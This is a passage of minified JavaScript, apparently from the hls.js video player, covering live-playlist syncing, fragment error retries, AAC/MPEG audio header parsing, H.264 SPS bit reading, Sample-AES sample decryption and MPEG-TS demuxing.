h;return(n=!!(n.lowLatencyMode&&null!=u&&u.length&&o))&&o&&!this.bitrateTest&&(a=a.concat(o),s=o.sn),(h=t<e?ir(i,a,t,e-l<t?0:l):a[a.length-1])&&(o=h.sn-r.startSN,i=(e=this.fragmentTracker.getState(h))===Tr||e===Er&&h.gap?h:i)&&h.sn===i.sn&&(!n||u[0].fragment.sn>h.sn)&&i&&h.level===i.level&&(t=a[1+o],h=h.sn<s&&this.fragmentTracker.getState(t)!==Tr?t:null),h}synchronizeToLiveEdge(t){var e,r,n,i,{config:a,media:s}=this;s&&(e=this.hls.liveSyncPosition,r=s.currentTime,i=t.fragments[0].start,n=t.edge,i=r>=i-a.maxFragLookUpTolerance&&r<=n,null!==e)&&s.duration>e&&(r<e||!i)&&(a=void 0!==a.liveMaxLatencyDuration?a.liveMaxLatencyDuration:a.liveMaxLatencyDurationCount*t.targetduration,!i&&s.readyState<4||r<n-a)&&(this.loadedmetadata||(this.nextLoadPosition=e),s.readyState)&&(this.warn(`Playback: ${r.toFixed(3)} is located too far from the end of live sliding playlist: ${n}, reset currentTime to : `+e.toFixed(3)),s.currentTime=e)}alignPlaylists(t,e){var r,n,i,s,{levels:a,levelLastLoaded:s,fragPrevious:o}=this,a=null!==s?a[s]:null;return(s=t.fragments.length)?(r=t.fragments[0].start,i=!e,n=t.alignedSliding&&N(r),i||!n&&!r?(function Fr(t,e,r){var n,i,a;e&&(function(t,e,r){return!(!e.details||!(r.endCC>r.startCC||t&&t.cc<r.startCC))}(t,n=e,i=r)&&(t=function(t,e){if(t=t.fragments,(e=e.fragments).length&&t.length){if((t=xr(t,e[0].cc))&&t.startPTS)return t;V.log("No frag in previous level to align on")}else V.log("No fragments to align")}(n.details,i))&&N(t.start)&&(V.log("Adjusting PTS using last level due to CC increase within current level "+i.url),Mr(t.start,i)),!r.alignedSliding&&e.details&&(n=r,(t=e.details).fragments.length)&&n.hasProgramDateTime&&t.hasProgramDateTime&&(i=t.fragments[0].programDateTime,t=((a=n.fragments[0].programDateTime)-i)/1e3+t.fragments[0].start)&&N(t)&&(V.log(`Adjusting PTS using programDateTime delta ${a-i}ms, sliding:${t.toFixed(3)} ${n.url} `),Mr(t,n)),r.alignedSliding||!e.details||r.skippedSegments||Ye(e.details,r))}(o,a,t),i=t.fragments[0].start,this.log(`Live playlist sliding: ${i.toFixed(2)} start-sn: ${e?e.startSN:"na"}->${t.startSN} prev-sn: ${o?o.sn:"na"} fragments: `+s),i):r):(this.warn("No fragments in live playlist"),0)}waitForCdnTuneIn(t){return t.live&&t.canBlockReload&&t.partTarget&&t.tuneInGoal>Math.max(t.partHoldBack,3*t.partTarget)}setStartPosition(t,e){let r=this.startPosition;var n,i;-1!==(r=r<e?-1:r)&&-1!==this.lastCurrentTime||(null!==(i=((n=null!==this.startTimeOffset)?this:t).startTimeOffset)&&N(i)?(r=e+i,i<0&&(r+=t.totalduration),r=Math.min(Math.max(e,r),e+t.totalduration),this.log(`Start time offset ${i} found in ${n?"multivariant":"media"} playlist, adjust startPosition to `+r),this.startPosition=r):t.live?r=this.hls.liveSyncPosition||e:this.startPosition=r=0,this.lastCurrentTime=r),this.nextLoadPosition=r}getLoadPosition(){var t=this.media;let e=0;return this.loadedmetadata&&t?e=t.currentTime:this.nextLoadPosition&&(e=this.nextLoadPosition),e}handleFragLoadAborted(t,e){this.transmuxer&&"initSegment"!==t.sn&&t.stats.aborted&&(this.warn(`Fragment ${t.sn}${e?" part "+e.index:""} of level ${t.level} was aborted`),this.resetFragmentLoading(t))}resetFragmentLoading(t){this.fragCurrent&&(this.fragContextChanged(t)||this.state===L_FRAG_LOADING_WAITING_RETRY)||(this.state=L_IDLE)}onFragmentOrKeyLoadError(t,e){e.chunkMeta&&!e.frag&&(o=this.getCurrentContext(e.chunkMeta))&&(e.frag=o.frag);var r,n,i,a,s,o=e.frag;o&&o.type===t&&this.levels&&(this.fragContextChanged(o)?this.warn(`Frag load error must match current frag to retry ${o.url} > `+(null==(r=this.fragCurrent)?void 0:r.url)):((r=e.details===H.FRAG_GAP)&&this.fragmentTracker.fragBuffered(o,!0),({action:s,retryCount:i=0,retryConfig:a}=(n=e.errorAction)||{}),n&&5===s&&a?(this.resetStartWhenNotLoaded(null!=(s=this.levelLastLoaded)?s:o.level),s=Ze(a,i),this.warn(`Fragment ${o.sn} of ${t} ${o.level} errored with ${e.details}, retrying loading ${i+1}/${a.maxNumRetry} in ${s}ms`),n.resolved=!0,this.retryDate=self.performance.now()+s,this.state=L_FRAG_LOADING_WAITING_RETRY):a&&n?(this.resetFragmentErrors(t),i<a.maxNumRetry?r||(n.resolved=!0):V.warn(e.details+` reached or exceeded max retry (${i})`)):2===(null==n?void 0:n.action)?this.state=L_WAITING_LEVEL:this.state=L_ERROR,this.tickImmediate()))}reduceLengthAndFlushBuffer(t){var e,r,n;return(this.state===L_PARSING||this.state===L_PARSED)&&(e=t.parent,(r=(n=this.getFwdBufferInfo(this.mediaBuffer,e))&&.5<n.len)&&this.reduceMaxBufferLength(n.len),(n=!r)&&this.warn(`Buffer full error while media.currentTime is not buffered, flush ${e} buffer`),t.frag&&(this.fragmentTracker.removeFragment(t.frag),this.nextLoadPosition=t.frag.start),this.resetLoadingState(),n)}resetFragmentErrors(t){t===_&&(this.fragCurrent=null),this.loadedmetadata||(this.startFragRequested=!1),this.state!==L_STOPPED&&(this.state=L_IDLE)}afterBufferFlushed(t,e,r){t&&(t=S.getBuffered(t),this.fragmentTracker.detectEvictedFragments(e,t,r),this.state===L_ENDED)&&this.resetLoadingState()}resetLoadingState(){this.log("Reset loading state"),this.fragCurrent=null,this.fragPrevious=null,this.state=L_IDLE}resetStartWhenNotLoaded(t){this.loadedmetadata||(this.startFragRequested=!1,null!=(t=this.levels?this.levels[t].details:null)&&t.live?(this.startPosition=-1,this.setStartPosition(t,0),this.resetLoadingState()):this.nextLoadPosition=this.startPosition)}resetWhenMissingContext(t){var e;this.warn(`The loading context changed while buffering fragment ${t.sn} of level ${t.level}. This chunk will not be buffered.`),this.removeUnbufferedFrags(),this.resetStartWhenNotLoaded(null!=(e=this.levelLastLoaded)?e:t.level),this.resetLoadingState()}removeUnbufferedFrags(t=0){this.fragmentTracker.removeFragmentsInRange(t,1/0,this.playlistType,!1,!0)}updateLevelTiming(i,t,a,s){const o=a.details;if(o){if(Object.keys(i.elementaryStreams).reduce(((t,e)=>{var r,n=i.elementaryStreams[e];return n?(r=n.endPTS-n.startPTS)<=0?(this.warn(`Could not parse fragment ${i.sn} ${e} duration reliably (${r})`),t||!1):(r=s?0:Ve(o,i,n.startPTS,n.endPTS,n.startDTS,n.endDTS),this.hls.trigger($.LEVEL_PTS_UPDATED,{details:o,level:a,drift:r,type:e,frag:i,start:n.startPTS,end:n.endPTS}),!0):t}),!1))a.fragmentError=0;else if(null===(null==(e=this.transmuxer)?void 0:e.error)){var e=new Error(`Found no media in fragment ${i.sn} of level ${i.level} resetting transmuxer to fallback to playlist timing`);if(0===a.fragmentError&&(a.fragmentError++,i.gap=!0,this.fragmentTracker.removeFragment(i),this.fragmentTracker.fragBuffered(i,!0)),this.warn(e.message),this.hls.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,fatal:!1,error:e,frag:i,reason:`Found no media in msn ${i.sn} of level "${a.url}"`}),!this.hls)return;this.resetTransmuxer()}this.state=L_PARSED,this.hls.trigger($.FRAG_PARSED,{frag:i,part:t})}else this.warn("level.details undefined")}resetTransmuxer(){this.transmuxer&&(this.transmuxer.destroy(),this.transmuxer=null)}recoverWorkerError(t){"demuxerWorker"===t.event&&(this.fragmentTracker.removeAllFragments(),this.resetTransmuxer(),this.resetStartWhenNotLoaded(null!=(t=null!=(t=this.levelLastLoaded)?t:null==(t=this.fragCurrent)?void 0:t.level)?t:0),this.resetLoadingState())}set state(t){var e=this._state;e!==t&&(this._state=t,this.log(e+"->"+t))}get state(){return this._state}}function Hr(){return self.SourceBuffer||self.WebKitSourceBuffer}function c(t="",e=9e4){return{type:t,id:-1,pid:-1,inputTimeScale:e,sequenceNumber:-1,samples:[],dropped:0}}class Vr{constructor(){this._audioTrack=void 0,this._id3Track=void 0,this.frameIndex=0,this.cachedData=null,this.basePTS=null,this.initPTS=null,this.lastPTS=null}resetInitSegment(t,e,r,n){this._id3Track={type:"id3",id:3,pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],dropped:0}}resetTimeStamp(t){this.initPTS=t,this.resetContiguity()}resetContiguity(){this.basePTS=null,this.lastPTS=null,this.frameIndex=0}canParse(t,e){return!1}appendFrame(t,e,r){}demux(t,e){this.cachedData&&(t=Yt(this.cachedData,t),this.cachedData=null);let i,r=It(t,0),n=r?r.length:0;var a,s,o=this._audioTrack,l=this._id3Track,u=r?(t=>{var e=xt(t);for(let t=0;t<e.length;t++){var r=e[t];if(Pt(r)){if(8!==r.data.byteLength)return;{var n=1&(r=new Uint8Array(r.data))[3];let t=(r[4]<<23)+(r[5]<<15)+(r[6]<<7)+r[7];return t/=45,n&&(t+=47721858.84),Math.round(t)}}}})(r):void 0,h=t.length;for((null===this.basePTS||0===this.frameIndex&&N(u))&&(this.basePTS=Wr(u,e,this.initPTS),this.lastPTS=this.basePTS),null===this.lastPTS&&(this.lastPTS=this.basePTS),r&&0<r.length&&l.samples.push({pts:this.lastPTS,dts:this.lastPTS,data:r,type:Ie,duration:Number.POSITIVE_INFINITY});n<h;)this.canParse(t,n)?(a=this.appendFrame(o,t,n))?(this.frameIndex++,this.lastPTS=a.sample.pts,n+=a.length,i=n):n=h:Rt(a=t,s=n)&&Dt(a,s+6)+10<=a.length-s?(r=It(t,n),l.samples.push({pts:this.lastPTS,dts:this.lastPTS,data:r,type:Ie,duration:Number.POSITIVE_INFINITY}),n+=r.length,i=n):n++,n===h&&i!==h&&(s=kt(t,i),this.cachedData?this.cachedData=Yt(this.cachedData,s):this.cachedData=s);return{audioTrack:o,videoTrack:c(),id3Track:l,textTrack:c()}}demuxSampleAes(t,e,r){return Promise.reject(new Error(`[${this}] This demuxer does not support Sample-AES decryption`))}flush(t){var e=this.cachedData;return e&&(this.cachedData=null,this.demux(e,0)),{audioTrack:this._audioTrack,videoTrack:c(),id3Track:this._id3Track,textTrack:c()}}destroy(){}}const Wr=(t,e,r)=>N(t)?90*t:9e4*e+(r?9e4*r.baseTime/r.timescale:0);function Yr(t,e){return 255===t[e]&&240==(246&t[e+1])}function qr(t,e){return 1&t[e+1]?7:9}function zr(t,e){return(3&t[e+3])<<11|t[e+4]<<3|(224&t[e+5])>>>5}function Qr(t,e){return e+1<t.length&&Yr(t,e)}function Xr(t,e,r,n,i){t.samplerate||(e=function(t,e,r,n){let i,a;var s;let o;var l=navigator.userAgent.toLowerCase(),u=n,h=[96e3,88200,64e3,48e3,44100,32e3,24e3,22050,16e3,12e3,11025,8e3,7350],c=(i=1+((192&e[r+2])>>>6),(60&e[r+2])>>>2);if(!(h.length-1<c))return s=(1&e[r+2])<<2,s|=(192&e[r+3])>>>6,V.log(`manifest codec:${n}, ADTS type:${i}, samplingIndex:`+c),a=/firefox/i.test(l)?6<=c?(i=5,o=new Array(4),c-3):(i=2,o=new Array(2),c):-1!==l.indexOf("android")?(i=2,o=new Array(2),c):(i=5,o=new Array(4),n&&(-1!==n.indexOf("mp4a.40.29")||-1!==n.indexOf("mp4a.40.5"))||!n&&6<=c?c-3:((n&&-1!==n.indexOf("mp4a.40.2")&&(6<=c&&1==s||/vivaldi/i.test(l))||!n&&1==s)&&(i=2,o=new Array(2)),c)),o[0]=i<<3,o[0]|=(14&c)>>1,o[1]|=(1&c)<<7,o[1]|=s<<3,5===i&&(o[1]|=(14&a)>>1,o[2]=(1&a)<<7,o[2]|=8,o[3]=0),{config:o,samplerate:h[c],channelCount:s,codec:"mp4a.40."+i,manifestCodec:u};t.trigger($.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,fatal:!0,reason:"invalid ADTS sampling index:"+c})}(e,r,n,i))&&(t.config=e.config,t.samplerate=e.samplerate,t.channelCount=e.channelCount,t.codec=e.codec,t.manifestCodec=e.manifestCodec,V.log(`parsed codec:${t.codec}, rate:${e.samplerate}, channels:`+e.channelCount))}function Jr(t){return 9216e4/t}function Zr(t,e,r,n,i){var a,s;n+=i*Jr(t.samplerate),i=function(t,e){var r=qr(t,e);if(e+r<=t.length&&0<(t=zr(t,e)-r))return{headerLength:r,frameLength:t}}(e,r);let o;return i?(({frameLength:i,headerLength:s}=i),i=s+i,(a=Math.max(0,r+i-e.length))?(o=new Uint8Array(i-s)).set(e.subarray(r+s,e.length),0):o=e.subarray(r+s,r+i),s={unit:o,pts:n},a||t.samples.push(s),{sample:s,length:i,missing:a}):(t=e.length-r,(o=new Uint8Array(t)).set(e.subarray(r,e.length),0),{sample:{unit:o,pts:n},length:t,missing:-1})}const tn=/\/emsg[-/]ID3/i;let en=null;const rn=[32,64,96,128,160,192,224,256,288,320,352,384,416,448,32,48,56,64,80,96,112,128,160,192,224,256,320,384,32,40,48,56,64,80,96,112,128,160,192,224,256,320,32,48,56,64,80,96,112,128,144,160,176,192,224,256,8,16,24,32,40,48,56,64,80,96,112,128,144,160],nn=[44100,48e3,32e3,22050,24e3,16e3,11025,12e3,8e3],an=[[0,72,144,12],[0,0,0,0],[0,72,144,12],[0,144,144,12]],sn=[0,1,1,4];function on(t,e,r,n,i){var a;return!(r+24>e.length)&&(a=ln(e,r))&&r+a.frameLength<=e.length?(n+=i*(9e4*a.samplesPerFrame/a.sampleRate),i={unit:e.subarray(r,r+a.frameLength),pts:n,dts:n},t.config=[],t.channelCount=a.channelCount,t.samplerate=a.sampleRate,t.samples.push(i),{sample:i,length:a.frameLength,missing:0}):void 0}function ln(t,e){var r,n,i,a,s,o=t[e+1]>>3&3,l=t[e+1]>>1&3,u=t[e+2]>>4&15,h=t[e+2]>>2&3;if(1!=o&&0!=u&&15!=u&&3!=h)return s=t[e+2]>>1&1,r=t[e+3]>>6,n=1e3*rn[14*(n=3==o?3-l:3==l?3:4)+u-1],u=nn[3*(u=3==o?0:2==o?1:2)+h],h=3==r?1:2,a=8*(o=an[o][l])*(i=sn[l]),o=Math.floor(o*n/u+s)*i,null===en&&(s=(navigator.userAgent||"").match(/Chrome\/(\d+)/i),en=s?parseInt(s[1]):0),!!en&&en<=87&&2==l&&224e3<=n&&0==r&&(t[e+3]=128|t[e+3]),{sampleRate:u,channelCount:h,frameLength:o,samplesPerFrame:a}}function un(t,e){return!(255!==t[e]||224&~t[e+1]||!(6&t[e+1]))}function hn(t,e){return e+1<t.length&&un(t,e)}class cn{constructor(t){this.data=void 0,this.bytesAvailable=void 0,this.word=void 0,this.bitsAvailable=void 0,this.data=t,this.bytesAvailable=t.byteLength,this.word=0,this.bitsAvailable=0}loadWord(){var t=this.data,e=this.bytesAvailable,r=t.byteLength-e,n=new Uint8Array(4);if(0===(e=Math.min(4,e)))throw new Error("no bytes available");n.set(t.subarray(r,r+e)),this.word=new DataView(n.buffer).getUint32(0),this.bitsAvailable=8*e,this.bytesAvailable-=e}skipBits(t){var e;t=Math.min(t,8*this.bytesAvailable+this.bitsAvailable),this.bitsAvailable>t||(t=(t-=this.bitsAvailable)-((e=t>>3)<<3),this.bytesAvailable-=e,this.loadWord()),this.word<<=t,this.bitsAvailable-=t}readBits(t){var e=Math.min(this.bitsAvailable,t),r=this.word>>>32-e;if(32<t&&V.error("Cannot read more than 32 bits at a time"),this.bitsAvailable-=e,0<this.bitsAvailable)this.word<<=e;else{if(!(0<this.bytesAvailable))throw new Error("no bits available");this.loadWord()}return 0<(e=t-e)&&this.bitsAvailable?r<<e|this.readBits(e):r}skipLZ(){let t;for(t=0;t<this.bitsAvailable;++t)if(this.word&2147483648>>>t)return this.word<<=t,this.bitsAvailable-=t,t;return this.loadWord(),t+this.skipLZ()}skipUEG(){this.skipBits(1+this.skipLZ())}skipEG(){this.skipBits(1+this.skipLZ())}readUEG(){var t=this.skipLZ();return this.readBits(t+1)-1}readEG(){var t=this.readUEG();return 1&t?1+t>>>1:-1*(t>>>1)}readBoolean(){return 1===this.readBits(1)}readUByte(){return this.readBits(8)}readUShort(){return this.readBits(16)}readUInt(){return this.readBits(32)}skipScalingList(e){let r=8,n=8;for(let t=0;t<e;t++)0!==n&&(n=(r+this.readEG()+256)%256),r=0===n?r:n}readSPS(){let t=0,e=0,r=0,n=0;var i,a;let s;var o=this.readUByte.bind(this),l=this.readBits.bind(this),u=this.readUEG.bind(this),h=this.readBoolean.bind(this),c=this.skipBits.bind(this),d=this.skipEG.bind(this),f=this.skipUEG.bind(this),p=this.skipScalingList.bind(this),g=(o(),o());if(l(5),c(3),o(),f(),(100===g||110===g||122===g||244===g||44===g||83===g||86===g||118===g||128===g)&&(3===(g=u())&&c(1),f(),f(),c(1),h()))for(a=3!==g?8:12,s=0;s<a;s++)h()&&p(s<6?16:64);if(f(),0===(g=u()))u();else if(1===g)for(c(1),d(),d(),i=u(),s=0;s<i;s++)d();f(),c(1),g=u(),f=u(),0===(l=l(1))&&c(1),c(1),h()&&(t=u(),e=u(),r=u(),n=u());let v=[1,1];if(h()&&h())switch(o()){case 1:v=[1,1];break;case 2:v=[12,11];break;case 3:v=[10,11];break;case 4:v=[16,11];break;case 5:v=[40,33];break;case 6:v=[24,11];break;case 7:v=[20,11];break;case 8:v=[32,11];break;case 9:v=[80,33];break;case 10:v=[18,11];break;case 11:v=[15,11];break;case 12:v=[64,33];break;case 13:v=[160,99];break;case 14:v=[4,3];break;case 15:v=[3,2];break;case 16:v=[2,1];break;case 255:v=[o()<<8|o(),o()<<8|o()]}return{width:Math.ceil(16*(g+1)-2*t-2*e),height:(2-l)*(f+1)*16-(l?2:4)*(r+n),pixelRatio:v}}readSliceType(){return this.readUByte(),this.readUEG(),this.readUEG()}}class dn{constructor(t,e,r){this.keyData=void 0,this.decrypter=void 0,this.keyData=r,this.decrypter=new Gr(e,{removePKCS7Padding:!1})}decryptBuffer(t){return this.decrypter.decrypt(t,this.keyData.key.buffer,this.keyData.iv.buffer)}decryptAacSample(e,r,n){const i=e[r].unit;var t;i.length<=16||(t=(t=i.subarray(16,i.length-i.length%16)).buffer.slice(t.byteOffset,t.byteOffset+t.length),this.decryptBuffer(t).then((t=>{t=new Uint8Array(t),i.set(t,16),this.decrypter.isSync()||this.decryptAacSamples(e,r+1,n)})))}decryptAacSamples(t,e,r){for(;;e++){if(e>=t.length)return void r();if(!(t[e].unit.length<32||(this.decryptAacSample(t,e,r),this.decrypter.isSync())))return}}getAvcEncryptedData(e){var t=16*Math.floor((e.length-48)/160)+16,r=new Int8Array(t);let n=0;for(let t=32;t<e.length-16;t+=160,n+=16)r.set(e.subarray(t,t+16),n);return r}getAvcDecryptedUnit(e,t){var r=new Uint8Array(t);let n=0;for(let t=32;t<e.length-16;t+=160,n+=16)e.set(r.subarray(n,n+16),t);return e}decryptAvcSample(e,r,n,i,a){const s=Qt(a.data);var t=this.getAvcEncryptedData(s);this.decryptBuffer(t.buffer).then((t=>{a.data=this.getAvcDecryptedUnit(s,t),this.decrypter.isSync()||this.decryptAvcSamples(e,r,n+1,i)}))}decryptAvcSamples(t,e,r,n){if(t instanceof Uint8Array)throw new Error("Cannot decrypt samples of type Uint8Array");for(;;e++,r=0){if(e>=t.length)return void n();for(var i=t[e].units;!(r>=i.length);r++){var a=i[r];if(!(a.data.length<=48||1!==a.type&&5!==a.type||(this.decryptAvcSample(t,e,r,n,a),this.decrypter.isSync())))return}}}}const I=188;class fn{constructor(t,e,r){this.observer=void 0,this.config=void 0,this.typeSupported=void 0,this.sampleAes=null,this.pmtParsed=!1,this.audioCodec=void 0,this.videoCodec=void 0,this._duration=0,this._pmtId=-1,this._avcTrack=void 0,this._audioTrack=void 0,this._id3Track=void 0,this._txtTrack=void 0,this.aacOverFlow=null,this.avcSample=null,this.remainderData=null,this.observer=t,this.config=e,this.typeSupported=r}static probe(t){return 0<(t=fn.syncOffset(t))&&V.warn("MPEG2-TS detected but first sync word found @ offset "+t),-1!==t}static syncOffset(i){var a=i.length;let s=Math.min(940,i.length-I)+1,o=0;for(;o<s;){let e=!1,r=-1,n=0;for(let t=o;t<a;t+=I){if(71!==i[t]){if(n)return-1;break}if(n++,-1===r&&0!==(r=t)&&(s=Math.min(r+18612,i.length-I)+1),(e=e||0===gn(i,t))&&1<n&&(0===r&&2<n||t+I>s))return r}o++}return-1}static createTrack(t,e){return{container:"video"===t||"audio"===t?"video/mp2t":void 0,type:t,id:jt[t],pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],dropped:0,duration:"audio"===t?e:void 0}}resetInitSegment(t,e,r,n){this.pmtParsed=!1,this._pmtId=-1,this._avcTrack=fn.createTrack("video"),this._audioTrack=fn.createTrack("audio",n),this._id3Track=fn.createTrack("id3"),this._txtTrack=fn.createTrack("text"),this._audioTrack.segmentCodec="aac",this.aacOverFlow=null,this.avcSample=null,this.remainderData=null,this.audioCodec=e,this.videoCodec=r,this._duration=n}resetTimeStamp(){}resetContiguity(){var{_audioTrack:t,_avcTrack:e,_id3Track:r}=this;t&&(t.pesData=null),e&&(e.pesData=null),r&&(r.pesData=null),this.aacOverFlow=null,this.avcSample=null,this.remainderData=null}demux(r,t,n=!1,e=!1){let i;n||(this.sampleAes=null);var a=this._avcTrack,s=this._audioTrack,o=this._id3Track,l=this._txtTrack;let u=a.pid,h=a.pesData,c=s.pid,d=o.pid,f=s.pesData,p=o.pesData,g=null,v=this.pmtParsed,m=this._pmtId,y=r.length;if(this.remainderData&&(y=(r=Yt(this.remainderData,r)).length,this.remainderData=null),y<I&&!e)return this.remainderData=r,{audioTrack:s,videoTrack:a,id3Track:o,textTrack:l};var E,T=Math.max(0,fn.syncOffset(r));(y-=(y-T)%I)<r.byteLength&&!e&&(this.remainderData=new Uint8Array(r.buffer,y,r.buffer.byteLength-y));let b=0;for(let e=T;e<y;e+=I)if(71===r[e]){var A=!!(64&r[e+1]),_=gn(r,e);let t;if(1<(48&r[e+3])>>4){if((t=e+5+r[e+4])===e+I)continue}else t=e+4;switch(_){case u:A&&(h&&(i=vn(h))&&this.parseAVCPES(a,l,i,!1),h={data:[],size:0}),h&&(h.data.push(r.subarray(t,e+I)),h.size+=e+I-t);break;case c:if(A){if(f&&(i=vn(f)))switch(s.segmentCodec){case"aac":this.parseAACPES(s,i);break;case"mp3":this.parseMPEGPES(s,i)}f={data:[],size:0}}f&&(f.data.push(r.subarray(t,e+I)),f.size+=e+I-t);break;case d:A&&(p&&(i=vn(p))&&this.parseID3PES(o,i),p={data:[],size:0}),p&&(p.data.push(r.subarray(t,e+I)),p.size+=e+I-t);break;case 0:A&&(t+=r[t]+1),m=this._pmtId=(31&(S=r)[(E=t)+10])<<8|S[E+11];break;case m:A&&(t+=r[t]+1);var S=function(t,e,r,n){var i={audio:-1,avc:-1,id3:-1,segmentCodec:"aac"},s=e+3+((15&t[e+1])<<8|t[e+2])-4;for(e+=12+((15&t[e+10])<<8|t[e+11]);e<s;){var o=gn(t,e);switch(t[e]){case 207:if(!n){V.log("ADTS AAC with AES-128-CBC frame encryption found in unencrypted stream");break}case 15:-1===i.audio&&(i.audio=o);break;case 21:-1===i.id3&&(i.id3=o);break;case 219:if(!n){V.log("H.264 with AES-128-CBC slice encryption found in unencrypted stream");break}case 27:-1===i.avc&&(i.avc=o);break;case 3:case 4:!0!==r.mpeg&&!0!==r.mp3?V.log("MPEG audio found, not supported in this browser"):-1===i.audio&&(i.audio=o,i.segmentCodec="mp3");break;case 36:V.warn("Unsupported HEVC stream type found")}e+=5+((15&t[e+3])<<8|t[e+4])}return i}(r,t,this.typeSupported,n);0<(u=S.avc)&&(a.pid=u),0<(c=S.audio)&&(s.pid=c,s.segmentCodec=S.segmentCodec),0<(d=S.id3)&&(o.pid=d),null===g||v||(V.warn(`MPEG-TS PMT found at ${e} after unknown PID '${g}'. Backtracking to sync byte @${T} to parse all TS packets.`),g=null,e=T-188),v=this.pmtParsed=!0;break;case 17:case 8191:break;default:g=_}}else b++;0<b&&(L=new Error(`Found ${b} TS packet/s that do not start with 0x47`),this.observer.emit($.ERROR,$.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,fatal:!1,error:L,reason:L.message})),a.pesData=h,s.pesData=f,o.pesData=p;var L={audioTrack:s,videoTrack:a,id3Track:o,textTrack:l};return e&&this.extractRemainingSamples(L),L}flush(){var t=this.remainderData;let e;return this.remainderData=null,e=t?this.demux(t,-1,!1,!0):{videoTrack:this._avcTrack,audioTrack:this._audioTrack,id3Track:this._id3Track,textTrack:this._txtTrack},this.extractRemainingSamples(e),this.sampleAes?this.decrypt(e,this.sampleAes):e}extractRemainingSamples(t){var{audioTrack:e,videoTrack:t,id3Track:r,textTrack:n}=t,i=t.pesData,a=e.pesData,s=r.pesData;let o;if(i&&(o=vn(i))?(this.parseAVCPES(t,n,o,!0),t.pesData=null):t.pesData=i,a&&(o=vn(a))){switch(e.segmentCodec){case"aac":this.parseAACPES(e,o);break;case"mp3":this.parseMPEGPES(e,o)}e.pesData=null}else null!=a&&a.size&&V.log("last AAC PES packet truncated,might overlap between fragments"),e.pesData=a;s&&(o=vn(s))?(this.parseID3PES(r,o),r.pesData=null):r.pesData=s}demuxSampleAes(t,e,r){return t=this.demux(t,r,!0,!this.config.progressive),r=this.sampleAes=new dn(this.observer,this.config,e),this.decrypt(t,r)}decrypt(n,i){return new Promise((t=>{const{audioTrack:e,videoTrack:r}=n;e.samples&&"aac"===e.segmentCodec?i.decryptAacSamples(e.samples,0,(()=>{r.samples?i.decryptAvcSamples(r.samples,0,0,(()=>{t(n)})):t(n)})):r.samples&&i.decryptAvcSamples(r.samples,0,0,(()=>{t(n)}))}))}destroy(){this._duration=0}parseAVCPES(a,r,s,t){var e=this.parseAVCNALu(a,s.data);let l,o=this.avcSample,u=!1;s.data=null,o&&e.length&&!a.audFound&&(mn(o,a),o=this.avcSample=pn(!1,s.pts,s.dts,"")),e.forEach((e=>{switch(e.type){case 1:{let t=!1;l=!0;var n=e.data;u&&4<n.length&&(2!==(n=new cn(n).readSliceType())&&4!==n&&7!==n&&9!==n||(t=!0)),t&&null!=(n=o)&&n.frame&&!o.key&&(mn(o,a),o=this.avcSample=null),(o=o||(this.avcSample=pn(!0,s.pts,s.dts,""))).frame=!0,o.key=t;break}case 5:l=!0,null!=(n=o)&&n.frame&&!o.key&&(mn(o,a),o=this.avcSample=null),(o=o||(this.avcSample=pn(!0,s.pts,s.dts,""))).key=!0,o.frame=!0;break;case 6:l=!0,zt(e.data,1,s.pts,r.samples);break;case 7:if(l=!0,u=!0,!a.sps){n=e.data;var t=new cn(n).readSPS(),i=(a.width=t.width,a.height=t.height,a.pixelRatio=t.pixelRatio,a.sps=[n],a.duration=this._duration,n.subarray(1,4));let r="avc1.";for(let e=0;e<3;e++){let t=i[e].toString(16);t.length<2&&(t="0"+t),r+=t}a.codec=r}break;case 8:l=!0,a.pps||(a.pps=[e.data]);break;case 9:l=!1,a.audFound=!0,o&&mn(o,a),o=this.avcSample=pn(!1,s.pts,s.dts,"");break;case 12:l=!0;break;default:l=!1,o&&(o.debug+="unknown NAL "+e.type+" ")}o&&l&&o.units.push(e)})),t&&o&&(mn(o,a),this.avcSample=null)}getLastNalUnit(t){let r,e=this.avcSample;return null!=(t=e=e&&0!==e.units.length?e:t[t.length-1])&&t.units&&(r=(t=e.units)[t.length-1]),r}parseAVCNALu(t,e){var r=e.byteLength;let n=t.naluState||0;var i,a,s,o=n,l=[];let u=0,h=-1,c=0;for(-1===n&&(h=0,c=31&e[0],n=0,u=1);u<r;){var d,f,p=e[u++];n=n?1===n?p?0:2:p?1===p?(0<=h?(d={data:e.subarray(h,u-n-1),type:c},l.push(d)):(d=this.getLastNalUnit(t.samples))&&(o&&u<=4-o&&d.state&&(d.data=d.data.subarray(0,d.data.byteLength-o)),0<(i=u-n-1))&&((f=new Uint8Array(d.data.byteLength+i)).set(d.data,0),f.set(e.subarray(0,i),d.data.byteLength),d.data=f,d.state=0),u<r?(h=u,c=i=31&e[u],0):-1):0:3:p?0:1}return 0<=h&&0<=n&&(a={data:e.subarray(h,r),type:c,state:n},l.push(a)),0===l.length&&(a=this.getLastNalUnit(t.samples))&&((s=new Uint8Array(a.data.byteLength+e.byteLength)).set(a.data,0),s.set(e,a.data.byteLength),a.data=s),t.naluState=n,l}parseAACPES(t,e){let r=0;var n,i,a=this.aacOverFlow;let o,h,s=e.data;for(a&&(this.aacOverFlow=null,u=a.missing,l=a.sample.unit.byteLength,-1===u?((c=new Uint8Array(l+s.byteLength)).set(a.sample.unit,0),c.set(s,l),s=c):(c=l-u,a.sample.unit.set(s.subarray(0,u),c),t.samples.push(a.sample),r=a.missing)),o=r,n=s.length;o<n-1&&!Qr(s,o);o++);if(o!==r){let t;var l=o<n-1,u=(t=l?"AAC PES did not start with ADTS header,offset:"+o:"No ADTS header found in AAC PES",new Error(t));if(V.warn("parsing error: "+t),this.observer.emit($.ERROR,$.ERROR,{type:K.MEDIA_ERROR,details:H.FRAG_PARSING_ERROR,fatal:!1,levelRetry:l,error:u,reason:t}),!l)return}if(Xr(t,this.observer,s,o,this.audioCodec),void 0!==e.pts)h=e.pts;else{if(!a)return void V.warn("[tsdemuxer]: AAC PES unknown PTS");var c=Jr(t.samplerate);h=a.sample.pts+c}let d=0;for(;o<n;){if(o+=(i=Zr(t,s,o,h,d)).length,i.missing){this.aacOverFlow=i;break}for(d++;o<n-1&&!Qr(s,o);o++);}}parseMPEGPES(t,e){var r=e.data,n=r.length;let i=0,a=0;var s=e.pts;if(void 0===s)V.warn("[tsdemuxer]: MPEG PES unknown PTS");else 